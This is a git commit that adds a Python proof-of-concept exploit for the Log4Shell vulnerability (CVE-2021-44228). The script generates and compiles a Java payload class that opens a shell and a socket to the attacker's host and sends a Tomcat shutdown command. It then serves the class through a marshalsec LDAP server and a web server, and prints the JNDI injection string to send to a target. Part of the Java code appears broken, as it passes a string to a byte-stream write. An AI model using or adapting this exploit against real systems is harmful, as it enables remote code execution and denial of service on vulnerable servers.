bd4a7d1062cb71cf6a6a3fc402af5171c505cbef
eden <eden.ekdahl@cybring.co>
2022-02-16 15:05:21 +0200

    poc

---
+++ poc.py
@@ -0,0 +1,113 @@
+#!/usr/bin/env python3
+
+import argparse
+from colorama import Fore, init
+import subprocess
+import threading
+from pathlib import Path
+import os
+from http.server import HTTPServer, SimpleHTTPRequestHandler
+import requests
+
+
+CUR_FOLDER = Path(__file__).parent.resolve()
+
+
+def generate_payload(userip: str, lport: int) -> None:
+    program = """
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.Socket;
+
+public class Exploit {
+
+    public Exploit() throws Exception {
+        String host="%s";
+        int port=%d;
+        String cmd="/bin/sh";
+        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+        Socket s=new Socket(host,port);
+        InputStream pi=p.getInputStream(),
+            pe=p.getErrorStream(),
+            si=s.getInputStream();
+        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+        so.write("sh /home/centos/drive/apache-tomcat-8.0.36/bin/shutdown.sh");
+        
+        p.destroy();
+        s.close();
+    }
+}
+""" % (userip, lport)
+
+    # writing the exploit to Exploit.java file
+
+    p = Path("Exploit.java")
+
+    try:
+        p.write_text(program)
+        subprocess.run([os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/javac"), str(p)])
+    except OSError as e:
+        print(Fore.RED + f'[-] Something went wrong {e}')
+        raise e
+    else:
+        print(Fore.GREEN + '[+] Exploit java class created success')
+
+
+def payload(userip: str, webport: int, lport: int) -> None:
+    generate_payload(userip, lport)
+
+    print(Fore.GREEN + '[+] Setting up LDAP server\n')
+
+    # create the LDAP server on new thread
+    t1 = threading.Thread(target=ldap_server, args=(userip, webport))
+    t1.start()
+
+    # start the web server
+    print(f"[+] Starting Webserver on port {webport} http://0.0.0.0:{webport}")
+    httpd = HTTPServer(('0.0.0.0', webport), SimpleHTTPRequestHandler)
+    httpd.serve_forever()
+
+
+def check_java() -> bool:
+    exit_code = subprocess.call([
+        os.path.join(CUR_FOLDER, 'jdk1.8.0_20/bin/java'),
+        '-version',
+    ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+    return exit_code == 0
+
+
+def ldap_server(userip: str, lport: int) -> None:
+    sendme = "${jndi:ldap://%s:1389/a}" % (userip)
+    print(Fore.GREEN + f"[+] Send me: {sendme}\n")
+
+    url = "http://{}:{}/#Exploit".format(userip, lport)
+    subprocess.run([
+        os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/java"),
+        "-cp",
+        os.path.join(CUR_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
+        "marshalsec.jndi.LDAPRefServer",
+        url,
+    ])
+
+
+def main() -> None:
+    init(autoreset=True)
+    print(Fore.BLUE + """
+[!] CVE: CVE-2021-44228
+[!] Github repo: https://github.com/kozmer/log4j-shell-poc
+""")
+
+    try:
+        if not check_java():
+            print(Fore.RED + '[-] Java is not installed inside the repository')
+            raise SystemExit(1)
+        ip = requests.get('http://ip.42.pl/raw').text
+        payload(ip, 8000, 9001)
+    except KeyboardInterrupt:
+        print(Fore.RED + "user interrupted the program.")
+        raise SystemExit(0)
+
+
+if __name__ == "__main__":
+    main()
